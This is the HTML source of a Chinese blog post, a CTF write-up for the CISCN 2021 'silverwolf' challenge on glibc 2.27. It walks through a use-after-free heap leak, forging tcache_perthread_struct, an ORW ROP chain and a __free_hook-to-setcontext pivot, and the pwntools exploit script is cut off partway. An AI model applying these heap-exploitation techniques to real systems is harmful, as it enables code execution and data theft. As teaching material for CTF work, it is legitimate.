@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="glibc2.27版本下的setcontext入门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识setcontext">
+<meta property="og:url" content="http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/index.html">
+<meta property="og:site_name" content="feichai&#39;s Blog">
+<meta property="og:description" content="glibc2.27版本下的setcontext入门">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-3.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-4.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-5.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-6.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-7.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-2-17205210992341.png">
+<meta property="article:published_time" content="2024-07-09T08:35:11.000Z">
+<meta property="article:modified_time" content="2024-07-09T12:05:39.584Z">
+<meta property="article:author" content="肥柴">
+<meta property="article:tag" content="orw">
+<meta property="article:tag" content="setcontext">
+<meta property="article:tag" content="unsortbin attack">
+<meta property="article:tag" content="tcache_perthread_struct">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-3.png">
+
+<link rel="canonical" href="http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>初识setcontext | feichai's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="feichai's Blog" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">feichai's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="肥柴">
+      <meta itemprop="description" content="柴柴就是世界第一可爱！！!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feichai's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初识setcontext
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-09 16:35:11 / 修改时间：20:05:39" itemprop="dateCreated datePublished" datetime="2024-07-09T16:35:11+08:00">2024-07-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>glibc2.27版本下的setcontext入门</p>
+<span id="more"></span>
+
+<p>例题为[CISCN 2021 初赛]silverwolf</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>关于tcache_perthread_struct在堆中是这样的，在有tcache的libc版本中，会生成一个tcache结构体，大小为0x240</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-3.png"></p>
+<p>内容如下，counts代表了各个大小的堆块的数量，entries代表了每个不同大小堆块的链表头</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-4.png"></p>
+<p>从heap_base + 0x10 开始，前0x40个字节分别代表了 0x20-0x410 40个不同大小堆块的数量，这也说明了为什么tcache中能存放的最大堆块是0x408</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-5.png"></p>
+<p>比如从heap_base + 0x10的前16个字节，分别代表了0x20到0x110大小的堆块的数量，对应着下图</p>
+<p>从heap_base + 0x10 + 0x40 开始，就是每个堆链的头地址</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-6.png"></p>
+<h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p>在 setcontext+53的地方，通过设置rdi的值，可以修改除了rax外的所有寄存器，但是在glibc2.29开始，rdi变为了rdx，利用会更加困难，这里先留个空，以后再填上</p>
+<p>在本题中，通过将[rdi+0xa0]设置为ROP的起始地址，赋值给rsp，利用ret指令控制rip执行ROP</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-7.png"></p>
+<h3 id="uaf泄露heap基址"><a href="#uaf泄露heap基址" class="headerlink" title="uaf泄露heap基址"></a>uaf泄露heap基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="伪造tcache-perthread-struct"><a href="#伪造tcache-perthread-struct" class="headerlink" title="伪造tcache_perthread_struct"></a>伪造tcache_perthread_struct</h3><p>通过伪造tcache_perthread_struct中堆块的个数，将记录大小为0x240的堆块的个数修改为7，并释放tcache_perthread_struct结构体，使其进入unsortbin泄露libc地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br></pre></td></tr></table></figure>
+
+<p>这里学到了一个细节，当用ROPgadget查找syscall指令时，某些地址上的syscall指令的下一条指令并不是ret，而当我们编写的ROP执行了这个syscall指令时，因为没有ret，所以rip并不会返回我们的ROP，所以ROP就没办法继续往下执行，而ROPgadget这个工具没办法查询”syscall ; ret”这种指令，而且如果我们直接用ida一个个查找的话，又特别慢，所以我这里有一个办法可以帮助我们更快的查找</p>
+<p>在ida中 shift+f2 执行下方代码即可帮助我们快速寻找“syscall ; ret”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x212D0</span>,<span class="number">0x199b7c</span>):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i)==<span class="number">0xf</span> <span class="keyword">and</span> get_wide_byte(i+<span class="number">1</span>)==<span class="number">0x5</span> <span class="keyword">and</span> get_wide_byte(i+<span class="number">2</span>)==<span class="number">0xc3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-2-17205210992341.png"></p>
+<h3 id="orw-ROP"><a href="#orw-ROP" class="headerlink" title="orw ROP"></a>orw ROP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<p>这里的话可以把</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<p>写成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(read)</span><br></pre></td></tr></table></figure>
+
+<p>read直接用libc查找就可以了，这样可以减少ROP的长度</p>
+<p>但是有一点要注意，libc中没有open函数，所以调用open函数需要用syscall来完成</p>
+<h3 id="布置payload"><a href="#布置payload" class="headerlink" title="布置payload"></a>布置payload</h3><p>pd前40个字节就是各个大小堆块的数量，直接填充0即可，然后就到了堆的链表头，覆盖为如下的地址后即即可实现任意地址写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">edit(pd)</span><br></pre></td></tr></table></figure>
+
+<p>申请0x10大小的堆块，将__free_hook修改为setcontext，往下同理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>
+
+<p>当free执行后，rdi会指向free的堆块，并执行setcontext，此时rdi的值就是stack_1，而rdi+0xa0 就是 stack_2，执行 setcontext 后，</p>
+<p>就是将stack_2中存储的值赋值给rsp，stack_2中存储着orw_1，此时rsp中就是orw_1,利用ret指令将其赋值给rip，然后rip就开始执行ROP了</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/silverwolf&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.27.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28997</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">    edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;\x00&#x27;</span>*<span 